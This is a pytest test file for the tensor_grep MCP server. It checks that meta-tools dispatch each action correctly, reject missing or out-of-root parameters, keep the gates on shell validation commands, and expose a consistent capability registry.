    assert spy.call_args.kwargs["max_symbols"] == 4


def test_tg_session_dispatches_context_render(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="CONTEXT_RENDER_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_session_context_render", spy)

    result = mcp_server.tg_session(
        action="context_render", session_id="sess-1", query="x", render_profile="compact"
    )
    assert result == "CONTEXT_RENDER_SENTINEL"
    assert spy.call_args.kwargs["render_profile"] == "compact"


def test_tg_session_dispatches_blast_radius(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="BR_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_session_blast_radius", spy)

    result = mcp_server.tg_session(
        action="blast_radius", session_id="sess-1", symbol="Foo", max_depth=2
    )
    assert result == "BR_SENTINEL"
    assert spy.call_args.kwargs["max_depth"] == 2


def test_tg_session_blast_radius_missing_symbol():
    from tensor_grep.cli import mcp_server

    payload = json.loads(mcp_server.tg_session(action="blast_radius", session_id="sess-1"))
    assert payload["error"]["code"] == "invalid_input"
    assert "symbol" in payload["error"]["message"]


def test_tg_session_dispatches_blast_radius_plan(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="BRP_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_session_blast_radius_plan", spy)

    result = mcp_server.tg_session(action="blast_radius_plan", session_id="sess-1", symbol="Foo")
    assert result == "BRP_SENTINEL"


def test_tg_session_dispatches_blast_radius_render(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="BRR_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_session_blast_radius_render", spy)

    result = mcp_server.tg_session(action="blast_radius_render", session_id="sess-1", symbol="Foo")
    assert result == "BRR_SENTINEL"


def test_tg_session_dispatches_file_importers(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="FILE_IMPORTERS_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_session_file_importers", spy)

    result = mcp_server.tg_session(action="file_importers", session_id="sess-1", file="foo.py")
    assert result == "FILE_IMPORTERS_SENTINEL"
    assert spy.call_args.kwargs["file"] == str((tmp_path / "foo.py").resolve())


def test_tg_session_file_importers_missing_file():
    from tensor_grep.cli import mcp_server

    payload = json.loads(mcp_server.tg_session(action="file_importers", session_id="sess-1"))
    assert payload["error"]["code"] == "invalid_input"
    assert "file" in payload["error"]["message"]


def test_tg_session_unknown_action():
    from tensor_grep.cli import mcp_server

    payload = json.loads(mcp_server.tg_session(action="bogus"))
    assert payload["error"]["code"] == "invalid_input"


def test_tg_scan_dispatches_scan(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="SCAN_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_ruleset_scan", spy)

    result = mcp_server.tg_scan(action="scan", ruleset="secrets-basic")
    assert result == "SCAN_SENTINEL"
    assert spy.call_args.kwargs["ruleset"] == "secrets-basic"


def test_tg_scan_dispatches_rulesets(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="RULESETS_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_rulesets", spy)

    assert mcp_server.tg_scan(action="rulesets") == "RULESETS_SENTINEL"


def test_tg_scan_unknown_action():
    from tensor_grep.cli import mcp_server

    payload = json.loads(mcp_server.tg_scan(action="bogus"))
    assert payload["error"]["code"] == "invalid_input"


def test_tg_audit_dispatches_manifest_verify(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="MV_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_audit_manifest_verify", spy)

    result = mcp_server.tg_audit(action="manifest_verify", manifest_path="manifest.json")
    assert result == "MV_SENTINEL"
    assert spy.call_args.kwargs["manifest_path"] == str((tmp_path / "manifest.json").resolve())


def test_tg_audit_manifest_verify_missing_manifest_path():
    from tensor_grep.cli import mcp_server

    payload = json.loads(mcp_server.tg_audit(action="manifest_verify"))
    assert payload["error"]["code"] == "invalid_input"


def test_tg_audit_dispatches_history(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="HISTORY_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_audit_history", spy)

    assert mcp_server.tg_audit(action="history") == "HISTORY_SENTINEL"


def test_tg_audit_dispatches_diff(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="DIFF_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_audit_diff", spy)

    result = mcp_server.tg_audit(
        action="diff", previous_manifest="prev.json", current_manifest="cur.json"
    )
    assert result == "DIFF_SENTINEL"
    assert spy.call_args.kwargs["current_manifest"] == str((tmp_path / "cur.json").resolve())


def test_tg_audit_diff_missing_current_manifest():
    from tensor_grep.cli import mcp_server

    payload = json.loads(mcp_server.tg_audit(action="diff", previous_manifest="prev.json"))
    assert payload["error"]["code"] == "invalid_input"


def test_tg_audit_dispatches_bundle_create(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="BUNDLE_CREATE_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_review_bundle_create", spy)

    result = mcp_server.tg_audit(
        action="bundle_create", manifest_path="manifest.json", checkpoint_id="cp-1"
    )
    assert result == "BUNDLE_CREATE_SENTINEL"
    assert spy.call_args.kwargs["checkpoint_id"] == "cp-1"


def test_tg_audit_bundle_create_missing_manifest_path():
    from tensor_grep.cli import mcp_server

    payload = json.loads(mcp_server.tg_audit(action="bundle_create"))
    assert payload["error"]["code"] == "invalid_input"


def test_tg_audit_dispatches_bundle_verify(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="BUNDLE_VERIFY_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_review_bundle_verify", spy)

    result = mcp_server.tg_audit(action="bundle_verify", bundle_path="bundle.json")
    assert result == "BUNDLE_VERIFY_SENTINEL"


def test_tg_audit_bundle_verify_missing_bundle_path():
    from tensor_grep.cli import mcp_server

    payload = json.loads(mcp_server.tg_audit(action="bundle_verify"))
    assert payload["error"]["code"] == "invalid_input"


def test_tg_audit_confines_every_secondary_param_regardless_of_action(
    tmp_path, monkeypatch, tmp_path_factory
):
    """Dedicated regression test for the build-precision decision behind tg_audit: it
    confines ALL of manifest_path/previous_manifest/current_manifest/scan_path/output_path/
    bundle_path UNCONDITIONALLY, before the action branch -- not only within the action that
    happens to use each one. Proven here with action="history" (which uses none of them) plus
    an out-of-root manifest_path; a per-action-only confinement design would let this through."""
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    outside = tmp_path_factory.mktemp("audit_outside")

    payload = json.loads(
        mcp_server.tg_audit(action="history", path=".", manifest_path=str(outside / "x.json"))
    )
    assert payload["error"]["code"] == "invalid_input"
    assert "must stay within" in payload["error"]["message"]


def test_tg_audit_unknown_action():
    from tensor_grep.cli import mcp_server

    payload = json.loads(mcp_server.tg_audit(action="bogus"))
    assert payload["error"]["code"] == "invalid_input"


def test_tg_checkpoint_dispatches_create(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="CREATE_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_checkpoint_create", spy)

    assert mcp_server.tg_checkpoint(action="create") == "CREATE_SENTINEL"


def test_tg_checkpoint_dispatches_list(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="LIST_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_checkpoint_list", spy)

    assert mcp_server.tg_checkpoint(action="list") == "LIST_SENTINEL"


def test_tg_checkpoint_dispatches_undo(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="UNDO_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_checkpoint_undo", spy)

    result = mcp_server.tg_checkpoint(action="undo", checkpoint_id="cp-1")
    assert result == "UNDO_SENTINEL"
    assert spy.call_args.kwargs["checkpoint_id"] == "cp-1"


def test_tg_checkpoint_undo_missing_checkpoint_id():
    from tensor_grep.cli import mcp_server

    payload = json.loads(mcp_server.tg_checkpoint(action="undo"))
    assert payload["error"]["code"] == "invalid_input"


def test_tg_checkpoint_unknown_action():
    from tensor_grep.cli import mcp_server

    payload = json.loads(mcp_server.tg_checkpoint(action="bogus"))
    assert payload["error"]["code"] == "invalid_input"


def test_tg_rewrite_dispatches_plan(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="PLAN_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_rewrite_plan", spy)

    result = mcp_server.tg_rewrite(action="plan", pattern="$X", replacement="$X", lang="python")
    assert result == "PLAN_SENTINEL"
    assert spy.call_args.kwargs["lang"] == "python"


@pytest.mark.parametrize(
    "kwargs",
    [
        {"replacement": "y", "lang": "python"},
        {"pattern": "x", "lang": "python"},
        {"pattern": "x", "replacement": "y"},
        {},
    ],
)
def test_tg_rewrite_missing_required_params(kwargs):
    from tensor_grep.cli import mcp_server

    payload = json.loads(mcp_server.tg_rewrite(action="plan", **kwargs))
    assert payload["error"]["code"] == "invalid_input"


def test_tg_rewrite_dispatches_apply_forwarding_policy_and_audit_manifest(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="APPLY_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_rewrite_apply", spy)

    result = mcp_server.tg_rewrite(
        action="apply",
        pattern="$X",
        replacement="$X",
        lang="python",
        checkpoint=True,
        policy="policy.json",
        audit_manifest="audit.json",
        expected_plan_digest="deadbeef",
        expected_match_count=2,
    )
    assert result == "APPLY_SENTINEL"
    kwargs = spy.call_args.kwargs
    assert kwargs["checkpoint"] is True
    assert kwargs["policy"] == "policy.json"
    assert kwargs["audit_manifest"] == "audit.json"
    assert kwargs["expected_plan_digest"] == "deadbeef"
    assert kwargs["expected_match_count"] == 2


def test_tg_rewrite_dispatches_diff(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    spy = MagicMock(return_value="DIFF_SENTINEL")
    monkeypatch.setattr(mcp_server, "tg_rewrite_diff", spy)

    result = mcp_server.tg_rewrite(action="diff", pattern="$X", replacement="$X", lang="python")
    assert result == "DIFF_SENTINEL"


def test_tg_rewrite_unknown_action():
    from tensor_grep.cli import mcp_server

    payload = json.loads(
        mcp_server.tg_rewrite(action="bogus", pattern="x", replacement="y", lang="python")
    )
    assert payload["error"]["code"] == "invalid_input"


# ------------------------------------------------------------------------------------------
# Fail-closed-class preservation (#98): a meta-tool dispatching to a native-required or
# validation-command-gated legacy tool must reproduce that tool's OWN fail-closed response
# byte-for-byte (aside from the outer envelope's tool/action bookkeeping fields already
# distinguishing the two callers) -- proving delegation, not reimplementation, is what
# preserves these contracts.
# ------------------------------------------------------------------------------------------


def test_tg_query_index_native_unavailable_matches_tg_index_search(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr(mcp_server, "resolve_native_tg_binary", lambda: None)

    direct = json.loads(mcp_server.tg_index_search(pattern="foo", path="."))
    via_meta = json.loads(mcp_server.tg_query(action="index", pattern="foo", path="."))

    assert via_meta["error"]["code"] == direct["error"]["code"] == "unavailable"
    assert via_meta["routing_reason"] == direct["routing_reason"] == "native-tg-unavailable"
    assert via_meta["error"]["remediation"] == direct["error"]["remediation"]
    assert via_meta["tool"] == direct["tool"] == "tg_index_search"


def test_tg_rewrite_diff_native_unavailable_matches_tg_rewrite_diff(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
    monkeypatch.setattr(mcp_server, "resolve_native_tg_binary", lambda: None)

    direct = json.loads(mcp_server.tg_rewrite_diff(pattern="$X", replacement="$X", lang="python"))
    via_meta = json.loads(
        mcp_server.tg_rewrite(action="diff", pattern="$X", replacement="$X", lang="python")
    )

    assert via_meta["error"]["code"] == direct["error"]["code"] == "unavailable"
    assert via_meta["routing_reason"] == direct["routing_reason"] == "native-tg-unavailable"
    assert via_meta["tool"] == direct["tool"] == "tg_rewrite_diff"


def test_tg_rewrite_apply_lint_cmd_gate_preserved_via_meta(monkeypatch, tmp_path):
    """lint_cmd/test_cmd execute a shell command and are refused unless
    TG_MCP_ALLOW_VALIDATION_COMMANDS=1 -- tg_rewrite must not re-implement (and potentially
    loosen) this gate; it must inherit it unchanged from tg_rewrite_apply."""
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    monkeypatch.delenv("TG_MCP_ALLOW_VALIDATION_COMMANDS", raising=False)

    payload = json.loads(
        mcp_server.tg_rewrite(
            action="apply",
            pattern="$X",
            replacement="$X",
            lang="python",
            lint_cmd="echo hi",
        )
    )
    assert payload["error"]["code"] == "unsupported_option"
    assert payload["error"]["retryable"] is False


def test_tg_rewrite_apply_test_cmd_gate_preserved_via_meta(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    monkeypatch.delenv("TG_MCP_ALLOW_VALIDATION_COMMANDS", raising=False)

    payload = json.loads(
        mcp_server.tg_rewrite(
            action="apply",
            pattern="$X",
            replacement="$X",
            lang="python",
            test_cmd="pytest",
        )
    )
    assert payload["error"]["code"] == "unsupported_option"


# ------------------------------------------------------------------------------------------
# Capability registry shape (#98 build-precision): the 10 meta tools carry mode="meta" +
# composes[] + actions{} with the 3-class signal; the 2 singletons are unconditional and
# never carry the legacy "mode" gate.
# ------------------------------------------------------------------------------------------


def test_meta_tool_capabilities_carry_composes_and_actions():
    from tensor_grep.cli import mcp_server

    for name in (
        "tg_navigate",
        "tg_impact",
        "tg_query",
        "tg_context",
        "tg_explore",
        "tg_session",
        "tg_scan",
        "tg_audit",
        "tg_checkpoint",
        "tg_rewrite",
    ):
        entry = mcp_server._MCP_TOOL_CAPABILITIES[name]
        assert entry["mode"] == "meta"
        assert isinstance(entry["composes"], list) and entry["composes"]
        assert isinstance(entry["actions"], dict) and entry["actions"]
        for action_flags in entry["actions"].values():
            assert set(action_flags) == {"native_required", "mutation", "embedded_fallback"}


def test_meta_tool_capabilities_query_index_action_native_required():
    from tensor_grep.cli import mcp_server

    assert (
        mcp_server._MCP_TOOL_CAPABILITIES["tg_query"]["actions"]["index"]["native_required"] is True
    )
    assert (
        mcp_server._MCP_TOOL_CAPABILITIES["tg_query"]["actions"]["text"]["native_required"] is False
    )
    # aggregate top-level flag reflects "ANY action requires native" for a client reading only
    # the flat field.
    assert mcp_server._MCP_TOOL_CAPABILITIES["tg_query"]["native_required"] is True


def test_meta_tool_capabilities_rewrite_apply_action_is_mutation():
    from tensor_grep.cli import mcp_server

    actions = mcp_server._MCP_TOOL_CAPABILITIES["tg_rewrite"]["actions"]
    assert actions["apply"]["mutation"] is True
    assert actions["plan"]["mutation"] is False
    assert actions["diff"]["mutation"] is False
    assert actions["diff"]["native_required"] is True


def test_singleton_capabilities_never_gate():
    """tg_mcp_capabilities/tg_classify_logs stay in _MCP_TOOL_CAPABILITIES unconditionally --
    proven directly against _build_mcp_tool_capabilities() output regardless of the CURRENT
    process's flag state (the subprocess tests above prove the flag-OFF case end-to-end; this
    is a same-process structural check that the singleton NAMES are present either way)."""
    from tensor_grep.cli import mcp_server

    for name in mcp_server._SINGLETON_MCP_TOOLS:
        assert name in mcp_server._MCP_TOOL_CAPABILITIES
        assert name not in mcp_server._PYTHON_LOCAL_MCP_TOOLS
        assert name not in mcp_server._EMBEDDED_SAFE_MCP_TOOLS
        assert name not in mcp_server._NATIVE_REQUIRED_MCP_TOOLS


def test_meta_and_singleton_tool_names_partition_cleanly():
    """The 10 meta names, the 2 singleton names, and the 46 legacy names (python-local +
    embedded-safe + native-required) must be pairwise disjoint and together equal the full
    default-ON registry -- a name accidentally listed in two groups would double-count or
    silently shadow in `_build_mcp_tool_capabilities`."""
    from tensor_grep.cli import mcp_server

    meta = set(mcp_server._META_MCP_TOOLS)
    singletons = set(mcp_server._SINGLETON_MCP_TOOLS)
    legacy = (
        set(mcp_server._PYTHON_LOCAL_MCP_TOOLS)
        | set(mcp_server._EMBEDDED_SAFE_MCP_TOOLS)
        | set(mcp_server._NATIVE_REQUIRED_MCP_TOOLS)
    )
    assert len(meta) == 10
    assert len(singletons) == 2
    assert len(legacy) == 46
    assert meta.isdisjoint(singletons)
    assert meta.isdisjoint(legacy)
    assert singletons.isdisjoint(legacy)
    assert meta | singletons | legacy == set(mcp_server._MCP_TOOL_CAPABILITIES)
